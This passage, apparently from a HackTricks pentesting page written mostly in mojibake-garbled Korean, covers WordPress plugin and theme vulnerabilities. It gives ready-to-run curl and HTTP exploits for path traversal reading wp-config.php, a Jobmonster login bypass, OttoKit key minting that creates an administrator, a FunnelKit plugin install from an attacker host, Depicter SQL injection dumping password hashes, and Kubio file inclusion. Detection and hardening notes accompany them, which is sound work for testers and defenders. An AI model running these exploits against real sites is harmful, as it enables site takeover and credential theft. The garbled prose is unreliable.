`$file_name`ì€ ê³µê²©ìê°€ ì œì–´í•˜ë©° **ì…ë ¥ ì •í™” ì—†ì´** ì—°ê²°ë©ë‹ˆë‹¤. ë‹¤ì‹œ ë§í•´, ìœ ì¼í•œ ê´€ë¬¸ì€ ì´ë ¥ì„œ í˜ì´ì§€ì—ì„œ ê°€ì ¸ì˜¬ ìˆ˜ ìˆëŠ” **CSRF nonce**ì…ë‹ˆë‹¤.

#### Exploitation
```bash
curl -G https://victim.com/wp-admin/admin-post.php \
--data-urlencode 'task=downloadcustomfile' \
--data-urlencode '_wpnonce=<nonce>' \
--data-urlencode 'upload_for=resume' \
--data-urlencode 'entity_id=1' \
--data-urlencode 'file_name=../../../wp-config.php'
```
ì„œë²„ê°€ `wp-config.php`ì˜ ë‚´ìš©ì„ ì‘ë‹µí•˜ì—¬, leaking DB credentials and auth keys.

## Social Login AJAX fallbackë¥¼ í†µí•œ ì¸ì¦ë˜ì§€ ì•Šì€ ê³„ì • íƒˆì·¨ (Jobmonster Theme <= 4.7.9)

ë§ì€ í…Œë§ˆ/í”ŒëŸ¬ê·¸ì¸ì´ admin-ajax.phpë¥¼ í†µí•´ ë…¸ì¶œëœ "social login" í—¬í¼ë¥¼ ì œê³µí•©ë‹ˆë‹¤. ë§Œì•½ ì¸ì¦ë˜ì§€ ì•Šì€ AJAX ì•¡ì…˜(wp_ajax_nopriv_...)ì´ provider ë°ì´í„°ê°€ ì—†ì„ ë•Œ í´ë¼ì´ì–¸íŠ¸ê°€ ì œê³µí•œ ì‹ë³„ìë¥¼ ì‹ ë¢°í•˜ê³  wp_set_auth_cookie()ë¥¼ í˜¸ì¶œí•˜ë©´, ì´ëŠ” ì™„ì „í•œ ì¸ì¦ ìš°íšŒê°€ ë©ë‹ˆë‹¤.

ì „í˜•ì ì¸ ì·¨ì•½ íŒ¨í„´(ë‹¨ìˆœí™”)
```php
public function check_login() {
// ... request parsing ...
switch ($_POST['using']) {
case 'fb':     /* set $user_email from verified Facebook token */ break;
case 'google': /* set $user_email from verified Google token   */ break;
// other providers ...
default: /* unsupported/missing provider â€“ execution continues */ break;
}

// FALLBACK: trust POSTed "id" as email if provider data missing
$user_email = !empty($user_email)
? $user_email
: (!empty($_POST['id']) ? esc_attr($_POST['id']) : '');

if (empty($user_email)) {
wp_send_json(['status' => 'not_user']);
}

$user = get_user_by('email', $user_email);
if ($user) {
wp_set_auth_cookie($user->ID, true); // ğŸ”¥ logs requester in as that user
wp_send_json(['status' => 'success', 'message' => 'Login successfully.']);
}
wp_send_json(['status' => 'not_user']);
}
// add_action('wp_ajax_nopriv_<social_login_action>', [$this, 'check_login']);
```
Why itâ€™s exploitable

- admin-ajax.phpë¥¼ í†µí•´ ì¸ì¦ ì—†ì´ ì ‘ê·¼ ê°€ëŠ¥ (wp_ajax_nopriv_â€¦ action).
- ìƒíƒœ ë³€ê²½ ì „ì— nonce/capability ê²€ì¦ì´ ì—†ìŒ.
- OAuth/OpenID provider ê²€ì¦ ëˆ„ë½; ê¸°ë³¸ ë¶„ê¸°(default branch)ê°€ ê³µê²©ì ì…ë ¥ì„ ìˆ˜ìš©í•¨.
- get_user_by('email', $_POST['id']) ë‹¤ìŒì— wp_set_auth_cookie($uid)ê°€ í˜¸ì¶œë˜ë©´ ìš”ì²­ìë¥¼ ê¸°ì¡´ ì´ë©”ì¼ ì£¼ì†Œì˜ ê³„ì •ìœ¼ë¡œ ì¸ì¦ì‹œí‚´.

Exploitation (unauthenticated)

- Prerequisites: ê³µê²©ìê°€ /wp-admin/admin-ajax.phpì— ì ‘ê·¼ ê°€ëŠ¥í•˜ê³  ìœ íš¨í•œ ì‚¬ìš©ì ì´ë©”ì¼ì„ ì•Œê³  ìˆê±°ë‚˜ ì¶”ì¸¡í•  ìˆ˜ ìˆìŒ.
- providerë¥¼ ì§€ì›ë˜ì§€ ì•ŠëŠ” ê°’ìœ¼ë¡œ ì„¤ì •(ë˜ëŠ” ìƒëµ)í•˜ì—¬ ê¸°ë³¸ ë¶„ê¸°(default branch)ë¥¼ íƒ€ê²Œ í•˜ê³  id=<victim_email>ë¥¼ ì „ë‹¬.
```http
POST /wp-admin/admin-ajax.php HTTP/1.1
Host: victim.tld
Content-Type: application/x-www-form-urlencoded

action=<vulnerable_social_login_action>&using=bogus&id=admin%40example.com
```

```bash
curl -i -s -X POST https://victim.tld/wp-admin/admin-ajax.php \
-d "action=<vulnerable_social_login_action>&using=bogus&id=admin%40example.com"
```
Expected success indicators

- HTTP 200 with JSON body like {"status":"success","message":"Login successfully."}.
- Set-Cookie: wordpress_logged_in_* for the victim user; subsequent requests are authenticated.

Finding the action name

- í…Œë§ˆ/í”ŒëŸ¬ê·¸ì¸ì—ì„œ social login ì½”ë“œì˜ add_action('wp_ajax_nopriv_...', '...') ë“±ë¡ì„ í™•ì¸ (ì˜ˆ: framework/add-ons/social-login/class-social-login.php).
- AJAX í•¸ë“¤ëŸ¬ ë‚´ë¶€ì—ì„œ wp_set_auth_cookie(), get_user_by('email', ...) ë“±ì„ grepë¡œ ê²€ìƒ‰.

Detection checklist

- /wp-admin/admin-ajax.phpì— ëŒ€í•´ social-login actionê³¼ id=<email>ì„ í¬í•¨í•œ ì¸ì¦ë˜ì§€ ì•Šì€ POSTê°€ ì›¹ ë¡œê·¸ì— ê¸°ë¡ë¨.
- ë™ì¼ IP/User-Agentì—ì„œ ì„±ê³µ JSONì„ ë°˜í™˜í•œ 200 ì‘ë‹µ ì§í›„ ì¸ì¦ëœ íŠ¸ë˜í”½ ë°œìƒ.

Hardening

- í´ë¼ì´ì–¸íŠ¸ ì…ë ¥ìœ¼ë¡œ ì‹ ì›ì„ ìœ ì¶”í•˜ì§€ ë§ˆë¼. ì´ë©”ì¼/IDëŠ” ê²€ì¦ëœ provider í† í°/IDì—ì„œë§Œ ìˆ˜ìš©í•œë‹¤.
- ë¡œê·¸ì¸ í—¬í¼ì—ë„ CSRF nonceì™€ capability ì²´í¬ë¥¼ ìš”êµ¬í•˜ë¼; ë¶ˆí•„ìš”í•œ ê²½ìš° wp_ajax_nopriv_ ë“±ë¡ì„ í”¼í•˜ë¼.
- OAuth/OIDC ì‘ë‹µì„ ì„œë²„ì‚¬ì´ë“œì—ì„œ ê²€ì¦í•˜ê³  í™•ì¸í•˜ë¼; ì œê³µì ëˆ„ë½/ì˜ëª»ëœ ê²½ìš°(POST idë¡œ í´ë°±í•˜ì§€ ë§ê³ ) ê±°ë¶€í•˜ë¼.
- ì„ì‹œë¡œ social loginì„ ë¹„í™œì„±í™”í•˜ê±°ë‚˜ ì—£ì§€ì—ì„œ ê°€ìƒ íŒ¨ì¹˜(ì·¨ì•½ action ì°¨ë‹¨)í•˜ì—¬ ìˆ˜ì •ë  ë•Œê¹Œì§€ ì°¨ë‹¨ì„ ê³ ë ¤í•˜ë¼.

Patched behaviour (Jobmonster 4.8.0)

- $_POST['id']ì˜ ë¶ˆì•ˆì „í•œ í´ë°±ì„ ì œê±°í•¨; $user_emailì€ switch($_POST['using'])ì˜ ê²€ì¦ëœ provider ë¶„ê¸°ì—ì„œ ìœ ë˜í•´ì•¼ í•¨.

## Unauthenticated privilege escalation via REST token/key minting on predictable identity (OttoKit/SureTriggers â‰¤ 1.0.82)

ì¼ë¶€ í”ŒëŸ¬ê·¸ì¸ì€ í˜¸ì¶œìì˜ ê¶Œí•œì„ ê²€ì¦í•˜ì§€ ì•Šê³  ì¬ì‚¬ìš© ê°€ëŠ¥í•œ â€œconnection keysâ€ ë˜ëŠ” í† í°ì„ ë°œê¸‰í•˜ëŠ” REST ì—”ë“œí¬ì¸íŠ¸ë¥¼ ë…¸ì¶œí•œë‹¤. ê²½ë¡œê°€ ì¶”ì¸¡ ê°€ëŠ¥í•œ ì†ì„±(ì˜ˆ: username)ë§Œìœ¼ë¡œ ì¸ì¦í•˜ê³ , keyë¥¼ current_user_can() ë˜ëŠ” ì—„ê²©í•œ permission_callbackê³¼ ê°™ì€ ì‚¬ìš©ì/ì„¸ì…˜ì— ë°”ì¸ë”©í•˜ì§€ ì•Šìœ¼ë©´, ì¸ì¦ë˜ì§€ ì•Šì€ ê³µê²©ìê°€ í‚¤ë¥¼ ë°œê¸‰í•´ ë‚´ë¶€ ê¶Œí•œ ë™ì‘(ê´€ë¦¬ì ê³„ì • ìƒì„±, í”ŒëŸ¬ê·¸ì¸ ë™ì‘ â†’ RCE)ì„ ì‹¤í–‰í•  ìˆ˜ ìˆë‹¤.

- Vulnerable route (example): sure-triggers/v1/connection/create-wp-connection
- Flaw: accepts a username, issues a connection key without current_user_can() or a strict permission_callback
- Impact: full takeover by chaining the minted key to internal privileged actions

PoC â€“ ì—°ê²° í‚¤ë¥¼ ë°œê¸‰í•œ ë’¤ ì‚¬ìš©í•˜ê¸°
```bash
# 1) Obtain key (unauthenticated). Exact payload varies per plugin
curl -s -X POST "https://victim.tld/wp-json/sure-triggers/v1/connection/create-wp-connection" \
-H 'Content-Type: application/json' \
--data '{"username":"admin"}'
# â†’ {"key":"<conn_key>", ...}

# 2) Call privileged plugin action using the minted key (namespace/route vary per plugin)
curl -s -X POST "https://victim.tld/wp-json/sure-triggers/v1/users" \
-H 'Content-Type: application/json' \
-H 'X-Connection-Key: <conn_key>' \
--data '{"username":"pwn","email":"p@t.ld","password":"p@ss","role":"administrator"}'
```
ì·¨ì•½í•œ ì´ìœ 
- ë¯¼ê°í•œ REST ê²½ë¡œê°€ ì—”íŠ¸ë¡œí”¼ê°€ ë‚®ì€ ì‹ë³„ ì¦ëª…(username)ì— ì˜í•´ì„œë§Œ ë³´í˜¸ë˜ê±°ë‚˜ permission_callbackì´ ëˆ„ë½ë¨
- ê¶Œí•œ ê²€ì‚¬ ì—†ìŒ; ë°œê¸‰ëœ í‚¤ê°€ ë²”ìš© ìš°íšŒë¡œë¡œ ìˆ˜ìš©ë¨

íƒì§€ ì²´í¬ë¦¬ìŠ¤íŠ¸
- plugin ì½”ë“œì—ì„œ register_rest_route(..., [ 'permission_callback' => '__return_true' ]) ë¥¼ grep
- ìš”ì²­ìœ¼ë¡œ ì œê³µëœ ì‹ë³„ ì •ë³´(username/email)ë¥¼ ë°”íƒ•ìœ¼ë¡œ tokens/keysë¥¼ ë°œê¸‰í•˜ë˜ ì¸ì¦ëœ ì‚¬ìš©ìë‚˜ ê¶Œí•œì— ë¬¶ì§€ ì•ŠëŠ” ëª¨ë“  ê²½ë¡œ
- ì„œë²„ ì¸¡ ê¶Œí•œ ê²€ì‚¬ ì—†ì´ ë°œê¸‰ëœ token/keyë¥¼ ìˆ˜ìš©í•˜ëŠ” ì´í›„ì˜ ê²½ë¡œë¥¼ ì°¾ì•„ë¼

ë³´ì•ˆ ê°•í™”
- ê¶Œí•œì´ í•„ìš”í•œ REST ê²½ë¡œì—ëŠ” í•´ë‹¹ capabilityì— ëŒ€í•´ current_user_can()ì„ ê°•ì œí•˜ëŠ” permission_callback í•„ìš”
- í´ë¼ì´ì–¸íŠ¸ ì œê³µ ì‹ë³„ë¡œ ì¥ê¸° í‚¤ë¥¼ ë°œê¸‰í•˜ì§€ ë§ ê²ƒ; í•„ìš”í•˜ë©´ ì¸ì¦ í›„ ë‹¨ê¸°ê°„, ì‚¬ìš©ì ë°”ì¸ë”©ëœ í† í°ì„ ë°œê¸‰í•˜ê³  ì‚¬ìš© ì‹œ ê¶Œí•œì„ ì¬ê²€ì‚¬
- í˜¸ì¶œìì˜ ì‚¬ìš©ì ì»¨í…ìŠ¤íŠ¸ë¥¼ ê²€ì¦ (wp_set_current_userë§Œìœ¼ë¡œëŠ” ë¶ˆì¶©ë¶„) í•˜ê³  !is_user_logged_in() || !current_user_can(<cap>) ì¸ ìš”ì²­ì€ ê±°ë¶€

---

## Nonce ê²Œì´íŠ¸ ì˜¤ìš© â†’ ì¸ì¦ë˜ì§€ ì•Šì€ ì„ì˜ì˜ plugin ì„¤ì¹˜ (FunnelKit Automations â‰¤ 3.5.3)

NoncesëŠ” CSRFë¥¼ ë°©ì§€í•  ë¿ authorizationì„ ë³´ì¥í•˜ì§€ ì•ŠëŠ”ë‹¤. ì½”ë“œê°€ nonce í†µê³¼ë¥¼ ìŠ¹ì¸ ì‹ í˜¸ë¡œ ì²˜ë¦¬í•˜ê³  ê¶Œí•œì´ í•„ìš”í•œ ì‘ì—…(ì˜ˆ: install/activate plugins)ì— ëŒ€í•œ capability ê²€ì‚¬ë¥¼ ê±´ë„ˆë›°ë©´, ì¸ì¦ë˜ì§€ ì•Šì€ ê³µê²©ìëŠ” ì•½í•œ nonce ìš”ê±´ì„ ì¶©ì¡±ì‹œì¼œ ë°±ë„ì–´ ë˜ëŠ” ì·¨ì•½í•œ pluginì„ ì„¤ì¹˜í•¨ìœ¼ë¡œì¨ RCEì— ì´ë¥¼ ìˆ˜ ìˆë‹¤.

- Vulnerable path: plugin/install_and_activate
- Flaw: weak nonce hash check; no current_user_can('install_plugins'|'activate_plugins') once nonce â€œpassesâ€
- Impact: full compromise via arbitrary plugin install/activation

PoC (shape depends on plugin; illustrative only)
```bash
curl -i -s -X POST https://victim.tld/wp-json/<fk-namespace>/plugin/install_and_activate \
-H 'Content-Type: application/json' \
--data '{"_nonce":"<weak-pass>","slug":"hello-dolly","source":"https://attacker.tld/mal.zip"}'
```
Detection checklist
- í”ŒëŸ¬ê·¸ì¸/í…Œë§ˆë¥¼ ìˆ˜ì •í•˜ëŠ” REST/AJAX í•¸ë“¤ëŸ¬ê°€ wp_verify_nonce()/check_admin_referer()ë§Œ ì‚¬ìš©í•˜ê³  ê¶Œí•œ ê²€ì‚¬ ì—†ìŒ
- nonce ê²€ì¦ í›„ $skip_caps = trueë¡œ ì„¤ì •ë˜ëŠ” ëª¨ë“  ì½”ë“œ ê²½ë¡œ

Hardening
- noncesë¥¼ í•­ìƒ CSRF í† í°ìœ¼ë¡œë§Œ ì·¨ê¸‰í•˜ì„¸ìš”; nonce ìƒíƒœì™€ ê´€ê³„ì—†ì´ ê¶Œí•œ ê²€ì‚¬ë¥¼ ì‹œí–‰í•˜ì„¸ìš”
- installer codeì— ë„ë‹¬í•˜ê¸° ì „ì— current_user_can('install_plugins') ë° current_user_can('activate_plugins')ë¥¼ ìš”êµ¬í•˜ì„¸ìš”
- ì¸ì¦ë˜ì§€ ì•Šì€ ì ‘ê·¼ì„ ê±°ë¶€í•˜ì„¸ìš”; ê¶Œí•œì´ í•„ìš”í•œ íë¦„ì— ëŒ€í•´ nopriv AJAX actionsë¥¼ ë…¸ì¶œí•˜ì§€ ë§ˆì„¸ìš”

---

## depicter-* actionsì˜ s (search) íŒŒë¼ë¯¸í„°ë¥¼ í†µí•œ ì¸ì¦ë˜ì§€ ì•Šì€ SQLi (Depicter Slider â‰¤ 3.6.1)

ì—¬ëŸ¬ depicter-* actionsê°€ s (search) íŒŒë¼ë¯¸í„°ë¥¼ ë°›ì•„ íŒŒë¼ë¯¸í„°í™” ì—†ì´ SQL ì¿¼ë¦¬ì— ë¬¸ìì—´ë¡œ ì—°ê²°í–ˆìŠµë‹ˆë‹¤.

- íŒŒë¼ë¯¸í„°: s (search)
- ê²°í•¨: WHERE/LIKE clausesì—ì„œ ì§ì ‘ ë¬¸ìì—´ ì—°ê²°; prepared statements/sanitization ì—†ìŒ
- ì˜í–¥: database exfiltration (users, hashes), lateral movement

PoC
```bash
# Replace action with the affected depicter-* handler on the target
curl -G "https://victim.tld/wp-admin/admin-ajax.php" \
--data-urlencode 'action=depicter_search' \
--data-urlencode "s=' UNION SELECT user_login,user_pass FROM wp_users-- -"
```
íƒì§€ ì²´í¬ë¦¬ìŠ¤íŠ¸
- Grep for depicter-* action handlers ë° SQLì—ì„œ $_GET['s'] ë˜ëŠ” $_POST['s']ì˜ ì§ì ‘ ì‚¬ìš© ê²€ìƒ‰
- $wpdb->get_results()/query()ì— së¥¼ ì—°ê²°í•˜ì—¬ ì „ë‹¬ë˜ëŠ” ì»¤ìŠ¤í…€ ì¿¼ë¦¬ ê²€í† 

í•˜ë“œë‹
- í•­ìƒ $wpdb->prepare() ë˜ëŠ” wpdb placeholders ì‚¬ìš©; ì„œë²„ ì¸¡ì—ì„œ ì˜ˆìƒì¹˜ ì•Šì€ ë©”íƒ€ë¬¸ì(reject unexpected metacharacters) ì°¨ë‹¨
- sì— ëŒ€í•´ ì—„ê²©í•œ allowlist ì¶”ê°€ ë° ì˜ˆìƒ charset/lengthë¡œ ì •ê·œí™”

---

## ì¸ì¦ë˜ì§€ ì•Šì€ Local File Inclusion via unvalidated template/file path (Kubio AI Page Builder â‰¤ 2.5.1)

ê²€ì¦/ì œí•œ ì—†ì´ template íŒŒë¼ë¯¸í„°ì— ê³µê²©ìê°€ ì œì–´í•˜ëŠ” ê²½ë¡œë¥¼ í—ˆìš©í•˜ë©´ ì„ì˜ì˜ ë¡œì»¬ íŒŒì¼ì„ ì½ì„ ìˆ˜ ìˆìœ¼ë©°, í¬í•¨ ê°€ëŠ¥í•œ PHP/log íŒŒì¼ì´ ëŸ°íƒ€ì„ì— í¬í•¨ë  ê²½ìš° íŠ¹ì • í™˜ê²½ì—ì„œ code executionì´ ë°œìƒí•  ìˆ˜ ìˆìŠµë‹ˆë‹¤.

- Parameter: __kubio-site-edit-iframe-classic-template
- Flaw: ì •ê·œí™”/í—ˆìš©ëª©ë¡ ì—†ìŒ; traversal permitted
- Impact: secret disclosure (wp-config.php), potential RCE in specific environments (log poisoning, includable PHP)

PoC â€“ wp-config.php ì½ê¸°
```bash
curl -i "https://victim.tld/?__kubio-site-edit-iframe-classic-template=../../../../wp-config.php"
```
íƒì§€ ì²´í¬ë¦¬ìŠ¤íŠ¸
- realpath() containment ì—†ì´ request ê²½ë¡œë¥¼ include()/require()/read sinkì— ì—°ê²°(concatenating)í•˜ëŠ” ëª¨ë“  handler
- ì˜ë„í•œ templates ë””ë ‰í† ë¦¬ ë°”ê¹¥ìœ¼ë¡œ ë²—ì–´ë‚˜ëŠ” traversal íŒ¨í„´(../)ì„ ì°¾ì•„ë¼

ë³´ì•ˆ ê°•í™”
- í—ˆìš©ëœ(allowlisted) templatesë¥¼ ê°•ì œ ì ìš©; realpath()ë¡œ í•´ì„í•˜ê³  require str_starts_with(realpath(file), realpath(allowed_base))
- ì…ë ¥ì„ ì •ê·œí™”(normalize)í•˜ê³  traversal ì‹œí€€ìŠ¤ ë° ì ˆëŒ€ ê²½ë¡œë¥¼ ì°¨ë‹¨(reject); sanitize_file_name()ì€ íŒŒì¼ëª…ì—ë§Œ ì‚¬ìš©(ì „ì²´ ê²½ë¡œì—ëŠ” ì‚¬ìš© ê¸ˆì§€)


## References

- [Unauthenticated Arbitrary File Deletion Vulnerability in Litho Theme](https://patchstack.com/articles/unauthenticated-arbitrary-file-delete-vulnerability-in-litho-the/)
- [Multiple Critical Vulnerabilities Patched in WP Job Portal Plugin](https://patchstack.com/articles/multiple-critical-vulnerabilities-patched-in-wp-job-portal-plugin/)
- [Rare Case of Privilege Escalation in ASE Plugin Affecting 100k+ Sites](https://patchstack.com/articles/rare-case-of-privilege-escalation-in-ase-plugin-affecting-100k-sites/)
- [ASE 7.6.3 changeset â€“ delete original roles on profile update](https://plugins.trac.wordpress.org/changeset/3211945/admin-site-enhancements/tags/7.6.3/classes/class-view-admin-as-role.php?old=3208295&old_path=admin-site-enhancements%2Ftags%2F7.6.2%2Fclasses%2Fclass-view-admin-as-role.php)
- [Hosting security tested: 87.8% of vulnerability exploits bypassed hosting defenses](https://patchstack.com/articles/hosting-security-tested-87-percent-of-vulnerability-exploits-bypassed-hosting-defenses/)
- [WooCommerce Payments â‰¤ 5.6.1 â€“ Unauth privilege escalation via trusted header (Patchstack DB)](https://patchstack.com/database/wordpress/plugin/woocommerce-payments/vulnerability/wordpress-woocommerce-payments-plugin-5-6-1-unauthenticated-privilege-escalation-vulnerability)
- [Hackers exploiting critical WordPress WooCommerce Payments bug](https://www.bleepingcomputer.com/news/security/hackers-exploiting-critical-wordpress-woocommerce-payments-bug/)
- [Unpatched Privilege Escalation in Service Finder Bookings Plugin](https://patchstack.com/articles/unpatched-privilege-escalation-in-service-finder-bookings-plugin/)
- [Service Finder Bookings privilege escalation â€“ Patchstack DB entry](https://patchstack.com/database/wordpress/plugin/sf-booking/vulnerability/wordpress-service-finder-booking-6-0-privilege-escalation-vulnerability)
- [Unauthenticated Broken Authentication Vulnerability in WordPress Jobmonster Theme](https://patchstack.com/articles/unauthenticated-broken-authentication-vulnerability-in-wordpress-jobmonster-theme/)
- [Q3 2025â€™s most exploited WordPress vulnerabilities and how RapidMitigate blocked them](https://patchstack.com/articles/q3-2025s-most-exploited-wordpress-vulnerabilities-and-how-patchstacks-rapidmitigate-blocked-them/)
- [OttoKit (SureTriggers) â‰¤ 1.0.82 â€“ Privilege Escalation (Patchstack DB)](https://patchstack.com/database/wordpress/plugin/suretriggers/vulnerability/wordpress-suretriggers-1-0-82-privilege-escalation-vulnerability)
- [FunnelKit Automations â‰¤ 3.5.3 â€“ Unauthenticated arbitrary plugin installation (Patchstack DB)](https://patchstack.com/database/wordpress/plugin/wp-marketing-automations/vulnerability/wordpress-recover-woocommerce-cart-abandonment-newsletter-email-marketing-marketing-automation-by-funnelkit-plugin-3-5-3-missing-authorization-to-unauthenticated-arbitrary-plugin-installation-vulnerability)
- [Depicter Slider â‰¤ 3.6.1 â€“ Unauthenticated SQLi via s parameter (Patchstack DB)](https://patchstack.com/database/wordpress/plugin/depicter/vulnerability/wordpress-depicter-slider-plugin-3-6-1-unauthenticated-sql-injection-via-s-parameter-vulnerability)
- [Kubio AI Page Builder â‰¤ 2.5.1 â€“ Unauthenticated LFI (Patchstack DB)](https://patchstack.com/database/wordpress/plugin/kubio/vulnerability/wordpress-kubio-ai-page-builder-plugin-2-5-1-unauthenticated-local-file-inclusion-vulnerability)

{{#include ../../banners/hacktricks-training.md}}
